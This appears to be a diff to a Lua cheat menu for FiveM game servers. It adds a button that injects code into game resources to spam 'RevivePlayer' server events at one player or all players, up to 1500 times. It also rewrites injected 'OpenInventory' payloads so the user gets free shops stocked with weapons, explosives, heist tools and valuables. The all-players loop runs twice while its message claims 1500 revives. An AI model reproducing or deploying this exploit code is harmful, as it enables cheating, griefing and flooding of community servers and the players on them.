@@ -371,6 +371,7 @@ end)
         end
     end)
 
+
     MachoMenuButton(PlayersSection, "Slap Player", function()
         local playerId = MachoMenuGetInputbox(playerIdInput)
         if playerId and playerId ~= "" then
@@ -811,6 +812,51 @@ end)
             MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
         end
     end)
+
+
+MachoMenuButton(PlayersSection, "No Rin", function()
+        local playerId = MachoMenuGetInputbox(playerIdInput)
+        if playerId and playerId ~= "" then
+            if playerId == "-1" then
+                -- Revive all players except me 1500 times
+                local myId = GetPlayerServerId(PlayerId())
+                local allPlayers = GetActivePlayers()
+                Citizen.CreateThread(function()
+                    for _, player in ipairs(allPlayers) do
+                        local serverId = GetPlayerServerId(player)
+                        if serverId ~= myId and serverId > 0 then
+                            for i = 1, 2 do
+                                for _, triggerData in ipairs(foundTriggers.items) do
+                                    MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. serverId .. ')')
+                                end
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                    MachoMenuNotification("Players", "✅ All players (except you) have been revived 1500 times")
+                end)
+            else
+                local numId = tonumber(playerId)
+                if numId and numId > 0 then
+                    -- Revive specific player 1500 times
+                    Citizen.CreateThread(function()
+                        for i = 1, 1500 do
+                            for _, triggerData in ipairs(foundTriggers.items) do
+                                MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ')')
+                            end
+                            Citizen.Wait(0)
+                        end
+                        MachoMenuNotification("Players", "✅ Player ID: " .. numId .. " has been revived 1500 times")
+                    end)
+                else
+                    MachoMenuNotification("Error", "❌ No valid ID was entered")
+                end
+            end
+        else
+            MachoMenuNotification("Error", "❌ No valid ID was entered")
+        end
+    end)
+        
 
     end
 
@@ -10760,8 +10806,8 @@ MachoMenuText(MenuWindow,"Triggers & Servers")
         
 MachoMenuButton(SelfSection, "Open Shop 1", function()
     MachoInjectResource2(2, "any", [[
-TriggerServerEvent('inventory:server:OpenInventory', 'shop', '.', {
-    label = ".",
+TriggerServerEvent('inventory:server:OpenInventory', 'shop', 'Shop', {
+    label = "Shop",
     slots = 1000,
     items = {
 
@@ -10773,19 +10819,15 @@ TriggerServerEvent('inventory:server:OpenInventory', 'shop', '.', {
         { amount = 1, info = {}, name = "weapon_pistol50",         price = 0, slot = 3,  type = "item" },
         { amount = 1, info = {}, name = "weapon_snspistol",        price = 0, slot = 4,  type = "item" },
         { amount = 1, info = {}, name = "weapon_revolver",         price = 0, slot = 5,  type = "item" },
-
         { amount = 1, info = {}, name = "weapon_carbinerifle",     price = 0, slot = 6,  type = "item" },
         { amount = 1, info = {}, name = "weapon_carbinerifle_mk2", price = 0, slot = 7,  type = "item" },
         { amount = 1, info = {}, name = "weapon_assaultrifle",     price = 0, slot = 8,  type = "item" },
         { amount = 1, info = {}, name = "weapon_compactrifle",     price = 0, slot = 9,  type = "item" },
-
         { amount = 1, info = {}, name = "weapon_smg",              price = 0, slot = 10, type = "item" },
         { amount = 1, info = {}, name = "weapon_microsmg",         price = 0, slot = 11, type = "item" },
         { amount = 1, info = {}, name = "weapon_combatmg",         price = 0, slot = 12, type = "item" },
-
         { amount = 1, info = {}, name = "weapon_assaultshotgun",   price = 0, slot = 13, type = "item" },
         { amount = 1, info = {}, name = "weapon_dbshotgun",        price = 0, slot = 14, type = "item" },
-
         { amount = 1, info = {}, name = "weapon_heavysniper",      price = 0, slot = 15, type = "item" },
 
         -- ======================
@@ -10816,53 +10858,54 @@ TriggerServerEvent('inventory:server:OpenInventory', 'shop', '.', {
         { amount = 50, info = {}, name = "HeavyArmor", price = 0, slot = 29, type = "item" },
         { amount = 50, info = {}, name = "bandage",    price = 0, slot = 30, type = "item" },
         { amount = 5000, info = {}, name = "firstaid", price = 0, slot = 31, type = "item" },
+        { amount = 50, info = {}, name = "ziptie",     price = 0, slot = 32, type = "item" },
 
         -- ======================
         -- [5] Illegal / Heist Tools
         -- ======================
-        { amount = 50, info = {}, name = "lockpick",    price = 0, slot = 32, type = "item" },
-        { amount = 50, info = {}, name = "gatecrack",   price = 0, slot = 33, type = "item" },
-        { amount = 50, info = {}, name = "drill",       price = 0, slot = 34, type = "item" },
-        { amount = 6,  info = {}, name = "laserdrill",  price = 0, slot = 35, type = "item" },
-        { amount = 50, info = {}, name = "large_drill", price = 0, slot = 36, type = "item" },
-        { amount = 50, info = {}, name = "small_drill", price = 0, slot = 37, type = "item" },
-        { amount = 50, info = {}, name = "thermite",    price = 0, slot = 38, type = "item" },
-        { amount = 50, info = {}, name = "explosives",  price = 0, slot = 39, type = "item" },
-        { amount = 10, info = {}, name = "bomb_c4",     price = 0, slot = 40, type = "item" },
-        { amount = 50, info = {}, name = "trojan_usb",  price = 0, slot = 41, type = "item" },
+        { amount = 50, info = {}, name = "lockpick",    price = 0, slot = 33, type = "item" },
+        { amount = 50, info = {}, name = "gatecrack",   price = 0, slot = 34, type = "item" },
+        { amount = 50, info = {}, name = "drill",       price = 0, slot = 35, type = "item" },
+        { amount = 6,  info = {}, name = "laserdrill",  price = 0, slot = 36, type = "item" },
+        { amount = 50, info = {}, name = "large_drill", price = 0, slot = 37, type = "item" },
+        { amount = 50, info = {}, name = "small_drill", price = 0, slot = 38, type = "item" },
+        { amount = 50, info = {}, name = "thermite",    price = 0, slot = 39, type = "item" },
+        { amount = 50, info = {}, name = "explosives",  price = 0, slot = 40, type = "item" },
+        { amount = 10, info = {}, name = "bomb_c4",     price = 0, slot = 41, type = "item" },
+        { amount = 50, info = {}, name = "trojan_usb",  price = 0, slot = 42, type = "item" },
 
         -- ======================
         -- [6] Utilities & Electronics
         -- ======================
-        { amount = 50, info = {}, name = "electronickit",   price = 0, slot = 42, type = "item" },
-        { amount = 50, info = {}, name = "screwdriverset",  price = 0, slot = 43, type = "item" },
-        { amount = 50, info = {}, name = "weaponrepairkit", price = 0, slot = 44, type = "item" },
-        { amount = 50, info = {}, name = "repairkit",       price = 0, slot = 45, type = "item" },
-        { amount = 50, info = {}, name = "radio",           price = 0, slot = 46, type = "item" },
-        { amount = 50, info = {}, name = "binoculars",      price = 0, slot = 47, type = "item" },
-        { amount = 50, info = {}, name = "phone",           price = 0, slot = 48, type = "item" },
-        { amount = 50, info = {}, name = "laptop",          price = 0, slot = 49, type = "item" },
-        { amount = 50, info = {}, name = "mdt",             price = 0, slot = 50, type = "item" },
-        { amount = 50, info = {}, name = "Tablet",          price = 0, slot = 51, type = "item" },
+        { amount = 50, info = {}, name = "electronickit",   price = 0, slot = 43, type = "item" },
+        { amount = 50, info = {}, name = "screwdriverset",  price = 0, slot = 44, type = "item" },
+        { amount = 50, info = {}, name = "weaponrepairkit", price = 0, slot = 45, type = "item" },
+        { amount = 50, info = {}, name = "repairkit",       price = 0, slot = 46, type = "item" },
+        { amount = 50, info = {}, name = "radio",           price = 0, slot = 47, type = "item" },
+        { amount = 50, info = {}, name = "binoculars",      price = 0, slot = 48, type = "item" },
+        { amount = 50, info = {}, name = "phone",           price = 0, slot = 49, type = "item" },
+        { amount = 50, info = {}, name = "laptop",          price = 0, slot = 50, type = "item" },
+        { amount = 50, info = {}, name = "mdt",             price = 0, slot = 51, type = "item" },
+        { amount = 50, info = {}, name = "Tablet",          price = 0, slot = 52, type = "item" },
 
         -- ======================
         -- [7] Food, Valuables & Materials
         -- ======================
-        { amount = 5000, info = {}, name = "atomstburger", price = 0, slot = 52, type = "item" },
-        { amount = 50,   info = {}, name = "fries",         price = 0, slot = 53, type = "item" },
+        { amount = 5000, info = {}, name = "atomstburger", price = 0, slot = 53, type = "item" },
+        { amount = 50,   info = {}, name = "fries",         price = 0, slot = 54, type = "item" },
 
-        { amount = 5000, info = {}, name = "money-roll",   price = 0, slot = 54, type = "item" },
-        { amount = 50,   info = {}, name = "goldchain",    price = 0, slot = 55, type = "item" },
-        { amount = 5000, info = {}, name = "10kgoldchain", price = 0, slot = 56, type = "item" },
-        { amount = 5000, info = {}, name = "diamond_ring", price = 0, slot = 57, type = "item" },
-        { amount = 1000, info = {}, name = "goldcoins",    price = 0, slot = 58, type = "item" },
+        { amount = 5000, info = {}, name = "money-roll",   price = 0, slot = 55, type = "item" },
+        { amount = 50,   info = {}, name = "goldchain",    price = 0, slot = 56, type = "item" },
+        { amount = 5000, info = {}, name = "10kgoldchain", price = 0, slot = 57, type = "item" },
+        { amount = 5000, info = {}, name = "diamond_ring", price = 0, slot = 58, type = "item" },
+        { amount = 1000, info = {}, name = "goldcoins",    price = 0, slot = 59, type = "item" },
 
-        { amount = 10000, info = {}, name = "aluminum",   price = 0, slot = 59, type = "item" },
-        { amount = 10000, info = {}, name = "iron",       price = 0, slot = 60, type = "item" },
-        { amount = 10000, info = {}, name = "steel",      price = 0, slot = 61, type = "item" },
-        { amount = 10000, info = {}, name = "plastic",    price = 0, slot = 62, type = "item" },
-        { amount = 10000, info = {}, name = "metalscrap", price = 0, slot = 63, type = "item" },
-        { amount = 10000, info = {}, name = "ganglap",    price = 0, slot = 64, type = "item" },
+        { amount = 10000, info = {}, name = "aluminum",   price = 0, slot = 60, type = "item" },
+        { amount = 10000, info = {}, name = "iron",       price = 0, slot = 61, type = "item" },
+        { amount = 10000, info = {}, name = "steel",      price = 0, slot = 62, type = "item" },
+        { amount = 10000, info = {}, name = "plastic",    price = 0, slot = 63, type = "item" },
+        { amount = 10000, info = {}, name = "metalscrap", price = 0, slot = 64, type = "item" },
+        { amount = 10000, info = {}, name = "ganglap",    price = 0, slot = 65, type = "item" },
     }
 })
 ]])
@@ -10872,109 +10915,152 @@ TriggerServerEvent('inventory:server:OpenInventory', 'shop', '.', {
 
         MachoMenuButton(SelfSection, "Open Shop 2", function()  
         MachoInjectResource2(2, "any", [[
-TriggerServerEvent('inventory:server:OpenInventory', 'shop', '.', {
-            items = {
-                -- الأسلحة
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 1, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 2, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 3, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 4, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 5, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 6, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 7, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 8, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 9, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 10, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 11, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 12, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 13, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 14, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 15, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 16, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 17, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 18, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 19, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 20, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 21, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 22, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 23, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 24, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 25, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 26, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 27, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 28, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 29, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 30, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 31, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 32, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 33, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 34, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 35, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 36, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 37, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 38, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 39, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 40, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 41, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 42, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 43, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 44, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 45, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 46, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 47, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 48, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 49, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 50, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 51, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 52, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 53, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 54, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 55, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 56, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 57, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 58, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 59, type = "item"},
-                {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 60, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 61, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 62, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 63, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 64, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 65, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 66, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 67, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 68, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 69, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 70, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 71, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 72, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 73, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 74, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 75, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 76, type = "item"},
-                {amount = 10000, info = {}, name = "pistol_ammo", price = 0, slot = 77, type = "item"},
-                {amount = 10000, info = {}, name = "snp_ammo", price = 0, slot = 78, type = "item"},
-                {amount = 10000, info = {}, name = "armor", price = 0, slot = 79, type = "item"},
-                {amount = 10000, info = {}, name = "ziptie", price = 0, slot = 80, type = "item"},
-            },
-            label = ".",
-            slots = 1000
-        })
+TriggerServerEvent('inventory:server:OpenInventory', 'shop', 'Shop-1', {
+    label = "Shop-1",
+    slots = 10000,
+    items = {
+
+        -- ======================
+        -- weapon_pistol_mk2 (1 - 40)
+        -- ======================
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 1, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 2, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 3, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 4, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 5, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 6, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 7, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 8, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 9, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 10, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 11, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 12, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 13, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 14, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 15, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 16, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 17, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 18, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 19, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 20, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 21, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 22, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 23, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 24, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 25, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 26, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 27, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 28, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 29, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 30, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 31, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 32, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 33, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 34, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 35, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 36, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 37, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 38, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 39, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 40, type = "item"},
+
+        -- ======================
+        -- weapon_pistol50 (41 - 80)
+        -- ======================
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 41, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 42, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 43, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 44, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 45, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 46, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 47, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 48, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 49, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 50, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 51, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 52, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 53, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 54, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 55, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 56, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 57, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 58, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 59, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 60, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 61, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 62, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 63, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 64, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 65, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 66, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 67, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 68, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 69, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 70, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 71, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 72, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 73, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 74, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 75, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 76, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 77, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 78, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 79, type = "item"},
+        {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 80, type = "item"},
+
+        -- ======================
+        -- weapon_heavypistol (81 - 120)
+        -- ======================
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 81, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 82, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 83, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 84, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 85, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 86, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 87, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 88, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 89, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 90, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 91, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 92, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 93, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 94, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 95, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 96, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 97, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 98, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 99, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 100, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 101, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 102, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 103, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 104, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 105, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 106, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 107, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 108, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 109, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 110, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 111, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 112, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 113, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 114, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 115, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 116, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 117, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 118, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 119, type = "item"},
+        {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 120, type = "item"},
+        {amount = 1000, info = {}, name = "pistol_suppressor", price = 0, slot = 121, type = "item"},
+        {amount = 1000, info = {}, name = "pistol_ammo", price = 0, slot = 122, type = "item"},
+        {amount = 1000, info = {}, name = "armor", price = 0, slot = 123, type = "item"},
+        {amount = 1000, info = {}, name = "ziptie", price = 0, slot = 124, type = "item"},
